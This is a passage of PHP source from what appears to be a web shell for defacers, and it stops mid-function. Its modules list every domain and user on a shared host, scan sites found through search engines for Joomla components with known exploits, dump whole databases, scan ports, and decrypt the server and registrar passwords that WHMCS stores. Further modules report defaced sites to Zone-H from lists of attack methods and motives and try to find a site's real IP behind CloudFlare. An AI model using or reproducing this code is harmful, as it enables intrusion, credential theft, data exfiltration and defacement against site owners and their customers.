	<option value="tutorial24" > Hacking Exposed-5 </option>
	<option value="tutorial25"> Internet Denial Of Service </option>
	<option value="tutorial26">Computer Viruses For Dummies</option>
	<option value="tutorial27">Hack Attacks Testing</option>
	<option value="tutorial28">Secrets Of A Super Hacker</option>
	<option value="tutorial29">Stealing The Network</option>
	<option value="tutorial30">Hacker's HandBook</option>
	</select>
	<input  type="submit" name="submit" class="inputzbut" value="Download">
	</td></form>
<td><form method="post" action="">&nbsp;
Tutorial by X'1N73CT &nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;
	<select class="inputzbut"  name="pilih" id="pilih">
	<option value=""selected>-----------------[ Select ]-----------------</option>
		<option value="tutorial2">Search Engine Hacking</option>
		<option value="tutorial3">SQL Injection dengan hackbar</option>
		<option value="tutorial1" >Bypass Union</option>
	</select>
	<input  type="submit" name="submit" class="inputzbut" value="Download">
</form></td>
</tr>
<tr>
<td>
<form method="post" action="">&nbsp;
E-Book from Syn|gress &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;
	<select class="inputzbut"  name="pilih" id="pilih">
	<option value=""selected>-----------------[ Select ]-----------------</option>
	<option value="cryptography_for_defeloper">Cryptography for Developer</option>
	<option value="tutorial31">Mobile Malware Attack and Defense</option>
	<option value="forensic">CD and DVD Forensic</option>
	<option value="ddd">Open Sourch Security Tools</option>
	<option value="metasploit">Metaslpoit Toolkit</option>
	<option value="stealing_network">Stealing the Network</option>
	<option value="security_polices">Creating Security Polices</option>
	</select>
	<input  type="submit" name="submit" class="inputzbut" value="Download">
</form></td>
<td>
<form method="post" action="">&nbsp;
X-CODE MAGAZINE &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;
	<select class="inputzbut" name="pilih" id="pilih">
	<option value=""selected>-----------------[ Select ]-----------------</option>
	<option value="tutorial4">X-CODE MAGAZINE 1</option>
	<option value="tutorial5">X-CODE MAGAZINE 2</option>
	<option value="tutorial6">X-CODE MAGAZINE 3</option>
	<option value="tutorial7">X-CODE MAGAZINE 4</option>
	<option value="tutorial8">X-CODE MAGAZINE 5</option>
	<option value="tutorial9">X-CODE MAGAZINE 6</option>
	<option value="tutorial10">X-CODE MAGAZINE 7</option>
	<option value="tutorial11">X-CODE MAGAZINE 8</option>
	<option value="tutorial12">X-CODE MAGAZINE 9</option>
	<option value="tutorial13">X-CODE MAGAZINE 10</option>
	<option value="tutorial14">X-CODE MAGAZINE 11</option>
	<option value="tutorial15">X-CODE MAGAZINE 12</option>
	<option value="tutorial16">X-CODE MAGAZINE 13</option>
	<option value="tutorial17">X-CODE MAGAZINE 14</option>
	<option value="tutorial18">X-CODE MAGAZINE 15</option>
	<option value="tutorial19">X-CODE MAGAZINE 16</option>
	<option value="tutorial20">X-CODE MAGAZINE 17</option>
	<option value="tutorial21">X-CODE MAGAZINE 18</option>
	<option value="tutorial22">X-CODE MAGAZINE 19</option>
	<option value="tutorial23">X-CODE MAGAZINE 20</option>
	<option value="tutorial024">X-CODE MAGAZINE 21</option>
	</select>
	<input type="submit" name="submit" class="inputzbut" value="Download" ></a>
</form></td></tr></table><br><br>
<?php
$submit = $_POST ['submit'];
if(isset($submit)) {
	$pilih = $_POST['pilih'];
		if ( $pilih == 'tutorial1') {
			?>
			<script>
				document.location = 'http://www.pharmconseil-elearning.com/main/upload/by_passing_illegal_mix_of_collations_for_operation__union__by_x_1n73ct.pdf';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial2') {
			?>
			<script>
				document.location = 'http://www.pharmconseil-elearning.com/main/upload/Search_engine_hacking_by_x_1n73ct.pdf';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial3') {
			?>
			<script>
				document.location = 'http://www.pharmconseil-elearning.com/main/upload/Sql_injection_dengan_hackbar.pdf';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial4') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_1.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial5') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_2.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial6') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_3.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial7') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_4.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial8') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_5.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial9') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_6.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial10') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_7.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial11') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_8.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial12') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode9.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial13') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode10.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial14') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode11.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial15') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/Xcode12.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial16') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/Xcode13.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial17') {
			?>
			<script>
				document.location = 'http://xcode.or.id/files/Xcode14.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial18') {
			?>
			<script>
				document.location = 'http://xcode.or.id/Xcode15.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial19') {
			?>
			<script>
				document.location = 'http://xcode.or.id/xcode_magazine_16.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial20') {
			?>
			<script>
				document.location = 'http://xcode.or.id/xcode_magazine_17.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial21') {
			?>
			<script>
				document.location = 'http://xcode.or.id/xcode_magazine_18.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial22') {
			?>
			<script>
				document.location = 'http://xcode.or.id/xcode_magazine_19.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial23') {
			?>
			<script>
				document.location = 'http://xcode.or.id/xcode_magazine_20.zip';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial024') {
			?>
			<script>
				document.location = 'http://xcode.or.id/xcode_magazine_21.zip';
			</script>
			<?php
		}
		
		elseif ( $pilih == 'tutorial24') {
			?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/hacking_exposed_5.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial25') {
			?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/internet_denial_of_service.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial26') {
			?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/computer_viruses_for_dummies.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial27') {
			?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/hack_attacks_testing.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial28') {
			?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/secrets_of_super_hacker.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial29') {
			?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/stealing_network_how_to_own_shadow.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial30') {
			?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/webapp_hackers_handbook.rar';
			</script>
			<?php
		}
		elseif ( $pilih == 'ddd') {
			?>
			<script>
				document.location = 'http://199.91.153.95/t8dni7k639hg/3o321lcwwk8u5bh/Open_Source_Security_Tools.pdf';
			</script>
			<?php
		}
		elseif ( $pilih == 'tutorial31') {
			?>
			<script>
				document.location = 'http://205.196.121.149/sg22hm8qjbhg/afsa7ibbk4ny2kd/Mobile_Malware_Attacks_and_Defense.pdf';
			</script>
			<?php
		}
		elseif ( $pilih == 'cryptography_for_defeloper') {
			?>
			<script>
				document.location = 'http://205.196.121.248/0sod33qw66ug/wypyz555sc9bn7h/Cryptography_for_Developers.pdf';
			</script>
			<?php
		}
		elseif ( $pilih == 'forensic') {
			?>
			<script>
				document.location = 'http://205.196.120.85/uisebgmioyjg/6l70l00ba9yoksq/CD_and_DVD_Forensics.pdf';
			</script>
			<?php
		}
		elseif ( $pilih == 'metasploit') {
			?>
			<script>
				document.location = 'http://199.91.153.192/3t115p2f6gvg/zvrrddmq6icqtd2/Metasploit_Toolkit.pdf';
			</script>
			<?php
		}elseif ( $pilih == 'stealing_network') {
			?>
			<script>
				document.location = 'http://205.196.123.138/wbsxltb8rbtg/5vm8a1d23i9zje3/Stealing_the_Network_-_How_to_Own_the_Box.pdf';
			</script>
			<?php
		}elseif ( $pilih == 'security_polices') {
			?>
			<script>
				document.location = 'http://199.91.153.73/6le01f562ehg/6l5ep021dhvlhlq/Creating_Security_Policies_and_Implementing_Identity_Management_with_Active_Directory.pdf';
			</script>
			<?php
		}
}

}
////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'cms_detect'))
    {
    ?>
    <form action="?y=<?php echo $pwd; ?>&x=cms_detect" method="post">
	<br><br><br><br><center><b><font size=4>+--=[ CMS Detector ]=--+</font></b></center><br><br>
    <?php
if(!file_exists('pee.tmp')){
@fopen('pee.tmp', 'w');

echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td><center><b>CMS</b></center></td></table>';

$p = 0;

if(is_readable("/var/named")){
$list = scandir("/var/named");
$current_dir = posix_getcwd();
$dir = explode("/",$current_dir);
foreach($list as $domain){
if(strpos($domain,".db"))
{
	$domain = str_replace('.db','',$domain);
	$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
	
error_reporting(0);

$link = $pageURL.'pee/'.$owner['name'];

cms_add($link,$domain,$owner['name'],"WordPress");
cms_add($link,$domain,$owner['name'],"Joomla");
cms_add($link,$domain,$owner['name'],"vBulletin");
cms_add($link,$domain,$owner['name'],"WHMCS");
cms_add($link,$domain,$owner['name'],"PhpBB");
cms_add($link,$domain,$owner['name'],"MyBB");
cms_add($link,$domain,$owner['name'],"IPB");
cms_add($link,$domain,$owner['name'],"SMF");
cms_add($link,$domain,$owner['name'],"Drupal");
cms_add($link,$domain,$owner['name'],"e107");
cms_add($link,$domain,$owner['name'],"Seditio");
cms_add($link,$domain,$owner['name'],"osCommerce");

}
}
}
}else{
echo'<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td><center><b>CMS</b></center></td></table><br><br>';
$content = file_get_contents($pageURL.'pee.tmp');
echo $content;
}
}
/////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'jss'))
    {
    ?>
    <form action="?y=<?php echo $pwd; ?>&x=jss" method="post">
    <?php
	echo '

<br><br><br><p align="center"><b><font size="3">Enter Targeting IP</font></b></p><br>
<form method="POST">
        <p align="center"><input type="text" class="inputz" name="site" size="65"><input class="inputzbut" type="submit" value="Scan"></p>
</form><center>

';
@set_time_limit(0);
@error_reporting(E_ALL | E_NOTICE);
 
function check_exploit($comxx){
 
$link ="http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$comxx&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=";
 
$result = @file_get_contents($link);
 
if (eregi("No results",$result))  {
 
echo"<td>Not Found</td><td><a href='http://www.google.com/#hl=en&q=download+$comxx+joomla+extension'>Download</a></td></tr>";
 
}else{
 
echo"<td><a href='$link'>Found</a></td><td><=</td></tr>";
 
}
}
 
function check_com($url){
 
$source = @file_get_contents($url);
 
preg_match_all('{option,(.*?)/}i',$source,$f);
preg_match_all('{option=(.*?)(&amp;|&|")}i',$source,$f2);
preg_match_all('{/components/(.*?)/}i',$source,$f3);
 
$arz=array_merge($f2[1],$f[1],$f3[1]);
 
$coms=array();
 
foreach(array_unique($arz) as $x){
$coms[]=$x;
}
 
foreach($coms as $comm){
 
echo "<tr><td>$comm</td>";
check_exploit($comm);
}
 
}
 
function sec($site){
preg_match_all('{http://(.*?)(/index.php)}siU',$site, $sites);
if(eregi("www",$sites[0][0])){
return $site=str_replace("index.php","",$sites[0][0]);
}else{
return $site=str_replace("http://","http://www.",str_replace("index.php","",$sites[0][0]));
}}
 
$npages = 50000;
 
if ($_POST)
{
  $ip = trim(strip_tags($_POST['site']));
  $npage = 1;
  $allLinks = array();
 
 
   while($npage <= $npages)
  {
 
  $x=@file_get_contents('http://www.bing.com/search?q=ip%3A' . $ip . '+index.php?option=com&first=' . $npage);
 
 
        if ($x)
        {
                preg_match_all('(<div class="sb_tlst">.*<h3>.*<a href="(.*)".*>(.*)</a>.*</h3>.*</div>siU', $x, $findlink);
              
                foreach ($findlink[1] as $fl)
              
                $allLinks[]=sec($fl);
              
              
                $npage = $npage + 10;
              
                if (preg_match('(first=' . $npage . '&amp)siU', $x, $linksuiv) == 0)
                        break;                    
        }
      
    else
                break;
  }
 
 
$allDmns = array();
 
foreach ($allLinks as $kk => $vv){
 
$allDmns[] = $vv;
}
                      
echo'<table border="1"  width=\"80%\" align=\"center\">
<tr><td width=\"30%\"><b>Server IP&nbsp;&nbsp;&nbsp;&nbsp; : </b></td><td><b>'.$ip.'</b></td></tr>                    
<tr><td width=\"30%\"><b>Sites Found&nbsp; : </b></td><td><b>'.count(array_unique($allDmns)).'</b></td></tr>
</table>';
echo "<br><br>";
 
echo'<table border="1" width="80%" align=\"center\">';
 
foreach(array_unique($allDmns) as $h3h3){
 
echo'<tr id=new><td><b><a href='.$h3h3.'>'.$h3h3.'</a></b></td><td><b>Exploit-db</b></td><td><b>challenge of Exploiting ..!</b></td></tr>';
 
check_com($h3h3);
 
}
 
echo"</table>";
 
}
}
/////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'dump'))
    {
    ?>
    <form action="?y=<?php echo $pwd; ?>&x=dump" method="post">
    <?php
echo $head.'<p align="center">';
echo '
<table width=371 class=tabnet >
<tr><th colspan="2">Database Dump</th></tr>
<tr>
	<td>Server </td>
	<td><input class="inputz" type=text name=server size=52></td></tr><tr>
	<td>Username</td>
	<td><input class="inputz" type=text name=username size=52></td></tr><tr>
	<td>Password</td>
	<td><input class="inputz" type=text name=password size=52></td></tr><tr>
	<td>DataBase Name</td>
	<td><input class="inputz" type=text name=dbname size=52></td></tr>
	<tr>
	<td>DB Type </td>
	<td><form method=post action="'.$me.'">
	<select class="inputz" name=method>
		<option  value="gzip">Gzip</option>
		<option value="sql">Sql</option>
		</select>
	<input class="inputzbut" type=submit value="  Dump!  " ></td></tr>
	</form></center></table>';
if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){
$date = date("Y-m-d");
$dbserver = $_POST['server'];
$dbuser = $_POST['username'];
$dbpass = $_POST['password'];
$dbname = $_POST['dbname'];
$file = "Dump-$dbname-$date";
$method = $_POST['method'];
if ($method=='sql'){
$file="Dump-$dbname-$date.sql";
$fp=fopen($file,"w");
}else{
$file="Dump-$dbname-$date.sql.gz";
$fp = gzopen($file,"w");
}
function write($data) {
global $fp;
if ($_POST['method']=='ssql'){
fwrite($fp,$data);
}else{
gzwrite($fp, $data);
}}
mysql_connect ($dbserver, $dbuser, $dbpass);
mysql_select_db($dbname);
$tables = mysql_query ("SHOW TABLES");
while ($i = mysql_fetch_array($tables)) {
    $i = $i['Tables_in_'.$dbname];
    $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
    write($create['Create Table'].";\n\n");
    $sql = mysql_query ("SELECT * FROM ".$i);
    if (mysql_num_rows($sql)) {
        while ($row = mysql_fetch_row($sql)) {
            foreach ($row as $j => $k) {
                $row[$j] = "'".mysql_escape_string($k)."'";
            }
            write("INSERT INTO $i VALUES(".implode(",", $row).");\n");
        }
    }
}
if ($method=='ssql'){
fclose ($fp);
}else{
gzclose($fp);}
header("Content-Disposition: attachment; filename=" . $file);   
header("Content-Type: application/download");
header("Content-Length: " . filesize($file));
flush();

$fp = fopen($file, "r");
while (!feof($fp))
{
    echo fread($fp, 65536);
    flush();
} 
fclose($fp); 
}

}
/////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'port-sc'))
    {
    ?>
    <form action="?y=<?php echo $pwd; ?>&x=port-sc" method="post">
    <?php
    echo '<br><br><center><br><b>+--=[ Port Scanner ]=--+</b><br>';
    $start = strip_tags($_POST['start']);
    $end = strip_tags($_POST['end']);
    $host = strip_tags($_POST['host']);
    if(isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])){
    for($i = $start; $i<=$end; $i++){
    $fp = @fsockopen($host, $i, $errno, $errstr, 3);
    if($fp){
    echo 'Port '.$i.' is <font color=green>open</font><br>';
    }
    flush();
    }
    }else{
    echo '<table class=tabnet style="width:300px;padding:0 1px;">
   <input type="hidden" name="y" value="phptools">
   <tr><th colspan="5">Port Scanner</th></center></tr>
   <tr>
		<td>Host</td>
		<td><input type="text" class="inputz"  style="width:220px;color:#00ff00;" name="host" value="localhost"/></td>
   </tr>
   <tr>
		<td>Port start</td>
		<td><input type="text" class="inputz" style="width:220px;color:#00ff00;" name="start" value="0"/></td>
   </tr>
	<tr><td>Port end</td>
		<td><input type="text" class="inputz"  style="width:220px;color:#00ff00;" name="end" value="5000"/></td>
   </tr><td><input class="inputzbut" type="submit" style="color:#00ff00" value="Scan Ports" />
   </td></form></center></table>';
    }
}
/////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'hash'))
    {
$submit= $_POST['enter'];
if (isset($submit)) {
$pass = $_POST['password']; // password
$salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
$hash = md5($pass); // md5 hash #1
$md4 = hash("md4",$pass);
$hash_md5 = md5($salt.$pass); // md5 hash with salt #2
$hash_md5_double = md5(sha1($salt.$pass)); // md5 hash with salt & sha1 #3
$hash1 = sha1($pass); // sha1 hash #4
$sha256 = hash("sha256",$text);
$hash1_sha1 = sha1($salt.$pass); // sha1 hash with salt #5
$hash1_sha1_double = sha1(md5($salt.$pass)); // sha1 hash with salt & md5 #6
}
echo '<form action="" method="post"><b><table class=tabnet>';
echo '<tr><th colspan="2">Password Hash</th></center></tr>';
echo '<tr><td><b>masukan kata yang ingin di encrypt:</b></td>';
echo '<td><input class="inputz" type="text" name="password" size="40" />';
echo '<input class="inputzbut" type="submit" name="enter" value="hash" />';
echo '</td></tr><br>';
echo '<tr><th colspan="2">Hasil Hash</th></center></tr>';
echo '<tr><td>Original Password</td><td><input class=inputz type=text size=50 value='.$pass.'></td></tr><br><br>';
echo '<tr><td>MD5</td><td><input class=inputz type=text size=50 value='.$hash.'></td></tr><br><br>';
echo '<tr><td>MD4</td><td><input class=inputz type=text size=50 value='.$md4.'></td></tr><br><br>';
echo '<tr><td>MD5 with Salt</td><td><input class=inputz type=text size=50 value='.$hash_md5.'></td></tr><br><br>';
echo '<tr><td>MD5 with Salt & Sha1</td><td><input class=inputz type=text size=50 value='.$hash_md5_double.'></td></tr><br><br>';
echo '<tr><td>Sha1</td><td><input class=inputz type=text size=50 value='.$hash1.'></td></tr><br><br>';
echo '<tr><td>Sha256</td><td><input class=inputz type=text size=50 value='.$sha256.'></td></tr><br><br>';
echo '<tr><td>Sha1 with Salt</td><td><input class=inputz type=text size=50 value='.$hash1_sha1.'></td></tr><br><br>';
echo '<tr><td>Sha1 with Salt & MD5</td><td><input class=inputz type=text size=50 value='.$hash1_sha1_double.'></td></tr><br><br></table>'; 
}

/////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'whmcs'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=whmcs" method="post">

<?php

function decrypt ($string,$cc_encryption_hash)
{
    $key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
    $hash_key = _hash ($key);
    $hash_length = strlen ($hash_key);
    $string = base64_decode ($string);
    $tmp_iv = substr ($string, 0, $hash_length);
    $string = substr ($string, $hash_length, strlen ($string) - $hash_length);
    $iv = $out = '';
    $c = 0;
    while ($c < $hash_length)
    {
        $iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
        ++$c;
    }
    $key = $iv;
    $c = 0;
    while ($c < strlen ($string))
    {
        if (($c != 0 AND $c % $hash_length == 0))
        {
            $key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
        }
        $out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
        ++$c;
    }
    return $out;
}

function _hash ($string)
{
    if (function_exists ('sha1'))
    {
        $hash = sha1 ($string);
    }
    else
    {
        $hash = md5 ($string);
    }
    $out = '';
    $c = 0;
    while ($c < strlen ($hash))
    {
        $out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
        $c += 2;
    }
    return $out;
}

echo "
<br><center><font size='5' color='#00ff00'><b>-=[ WHMCS Decoder ]=-</b></font></center>
<center>
<br>

<FORM action=''  method='post'>
<input type='hidden' name='form_action' value='2'>
<br>
<table class=tabnet style=width:320px;padding:0 1px;>
<tr><th colspan=2>WHMCS Decoder</th></tr> 
<tr><td>db_host </td><td><input type='text' style='color:#00ff00;background-color:' class='inputz' size='38' name='db_host' value='localhost'></td></tr>
<tr><td>db_username </td><td><input type='text' style='color:#00ff00;background-color:' class='inputz' size='38' name='db_username' value=''></td></tr>
<tr><td>db_password</td><td><input type='text' style='color:#00ff00;background-color:' class='inputz' size='38' name='db_password' value=''></td></tr>
<tr><td>db_name</td><td><input type='text' style='color:#00ff00;background-color:' class='inputz' size='38' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash</td><td><input style='color:#00ff00;background-color:' type='text' class='inputz' size='38' name='cc_encryption_hash' value=''></td></tr>
<td>&nbsp;&nbsp;&nbsp;&nbsp;<INPUT class='inputzbut' type='submit' style='color:#00ff00;background-color:'  value='Submit' name='Submit'></td>
</table>
</FORM>
</center>
";

 if($_POST['form_action'] == 2 )
 {
 //include($file);
 $db_host=($_POST['db_host']);
 $db_username=($_POST['db_username']);
 $db_password=($_POST['db_password']);
 $db_name=($_POST['db_name']);
 $cc_encryption_hash=($_POST['cc_encryption_hash']);



    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblservers");
while($v = mysql_fetch_array($query)) {
$ipaddress = $v['ipaddress'];
$username = $v['username'];
$type = $v['type'];
$active = $v['active'];
$hostname = $v['hostname'];
echo("<center><table border='1'>");
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>Type</td><td>$type</td></tr>");
echo("<tr><td>Active</td><td>$active</td></tr>");
echo("<tr><td>Hostname</td><td>$hostname</td></tr>");
echo("<tr><td>Ip</td><td>$ipaddress</td></tr>");
echo("<tr><td>Username</td><td>$username</td></tr>");
echo("<tr><td>Password</td><td>$password</td></tr>");

echo "</table><br><br></center>";
}

    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblregistrars");
echo("<center>Domain Reseller <br><table class=tabnet border='1'>");
echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
while($v = mysql_fetch_array($query)) {
$registrar     = $v['registrar'];
$setting = $v['setting'];
$value = decrypt ($v['value'], $cc_encryption_hash);
if ($value=="") {
$value=0;
}
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
}
}
}

elseif(isset($_GET['x']) && ($_GET['x'] == 'zone'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=zone" method="post">

<br><br><center>
<!-- Zone-H -->
<form action="" method='POST'><table><table class='tabnet'><tr>
<td style='background-color:#0000;padding-left:10px;'><tr><tr><th colspan="2"><h2>Zone-H Defacer</h2></th></tr></td></tr><tr><td height='45' colspan='2'><form method="post">
<input type="text" class="inputz" name="defacer" value="Nama Defacer" />
<select name="hackmode" class="inputz" >
<option >------------------------Pilih Salah Satu------------------------</option>
<option value="1">known vulnerability (i.e. unpatched system)</option>
<option value="2" >undisclosed (new) vulnerability</option>
<option value="3" >configuration / admin. mistake</option>
<option value="4" >brute force attack</option>
<option value="5" >social engineering</option>
<option value="6" >Web Server intrusion</option>
<option value="7" >Web Server external module intrusion</option>
<option value="8" >Mail Server intrusion</option>
<option value="9" >FTP Server intrusion</option>
<option value="10" >SSH Server intrusion</option>
<option value="11" >Telnet Server intrusion</option>
<option value="12" >RPC Server intrusion</option>
<option value="13" >Shares misconfiguration</option>
<option value="14" >Other Server intrusion</option>
<option value="15" >SQL Injection</option>
<option value="16" >URL Poisoning</option>
<option value="17" >File Inclusion</option>
<option value="18" >Other Web Application bug</option>
<option value="19" >Remote administrative panel access bruteforcing</option>
<option value="20" >Remote administrative panel access password guessing</option>
<option value="21" >Remote administrative panel access social engineering</option>
<option value="22" >Attack against administrator(password stealing/sniffing)</option>
<option value="23" >Access credentials through Man In the Middle attack</option>
<option value="24" >Remote service password guessing</option>
<option value="25" >Remote service password bruteforce</option>
<option value="26" >Rerouting after attacking the Firewall</option>
<option value="27" >Rerouting after attacking the Router</option>
<option value="28" >DNS attack through social engineering</option>
<option value="29" >DNS attack through cache poisoning</option>
<option value="30" >Not available</option>
</select>

<select name="reason" class="inputz" >
<option >-------------Pilih Salah Satu---------------</option>
<option value="1" >Heh...just for fun!</option>
<option value="2" >Revenge against that website</option>
<option value="3" >Political reasons</option>
<option value="4" >As a challenge</option>
<option value="5" >I just want to be the best defacer</option>
<option value="6" >Patriotism</option>
<option value="7" >Not available</option>
</select>
<input type="hidden" name="action" value="zone">
<center><textarea style="background:black;outline:none;" name="domain" cols="116" rows="9" id="domains">List Of Domains</textarea>
<br /><input class='inputzbut' type="submit" value="Send Now !" name="SendNowToZoneH" /><br></center></table>
</form></td></tr></table></form>
<!-- End Of Zone-H -->
</td></center><br><br>

<?php
echo '<center>';
	ob_start();
	$sub = get_loaded_extensions();
	if(!in_array("curl", $sub)){die('[-] Curl Is Not Supported !! ');}
	$hacker = $_POST['defacer'];
	$method = $_POST['hackmode'];
	$neden = $_POST['reason'];
	$site = $_POST['domain'];
	
	if (empty($hacker)){die ("[-] You Must Fill the Attacker name !");}
	elseif($method == "--------SELECT--------") {die("[-] You Must Select The Method !");}
	elseif($neden == "--------SELECT--------") {die("[-] You Must Select The Reason");}
	elseif(empty($site)) {die("[-] You Must Inter the Sites List ! ");}
	$i = 0;
	$sites = explode("\n", $site);
	while($i < count($sites)) 
	{
		if(substr($sites[$i], 0, 4) != "http") {$sites[$i] = "http://".$sites[$i];}
		ZoneH("http://zone-h.org/notify/single", $hacker, $method, $neden, $sites[$i]);
		echo "Site : ".$sites[$i]." Defaced !\n";
		++$i;
	}
	echo "[+] Sending Sites To Zone-H Has Been Completed Successfully !! ";

	echo '</center>';
}

/////////////////////////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'bypass-cf'))
{	
echo '
<form method="POST"><br><br>
<center><p align="center" dir="ltr"><b><font size="5" face="Tahoma">+--=[ Bypass
<font color="#CC0000">CloudFlare</font> ]=--+</font></b></p>
<select class="inputz" name="krz">
	<option>ftp</option>
		<option>direct-conntect</option>
			<option>webmail</option>
				<option>cpanel</option>
</select>
<input class="inputz" type="text" name="target" value="url">
<input class="inputzbut" type="submit" value="Bypass"></center>

';

$target = $_POST['target'];
# Bypass From FTP
if($_POST['krz'] == "ftp") {
$ftp = gethostbyname("ftp."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$ftp</font></p>";
} 
# Bypass From Direct-Connect
if($_POST['krz'] == "direct-conntect") {
$direct = gethostbyname("direct-connect."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$direct</font></p>";
}
# Bypass From Webmail
if($_POST['krz'] == "webmail") {
$web = gethostbyname("webmail."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$web</font></p>";
}
# Bypass From Cpanel
if($_POST['krz'] == "cpanel") {
$cpanel = gethostbyname("cpanel."."$target");
echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$cpanel</font></p>";
}
}
//////////////////////////////////////////////////////////////////////////////////////////////



//////////////////////////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'hashid')) {
if(isset($_POST['gethash'])){
		$hash = $_POST['hash'];
		if(strlen($hash)==32){
			$hashresult = "MD5 Hash";
		}elseif(strlen($hash)==40){
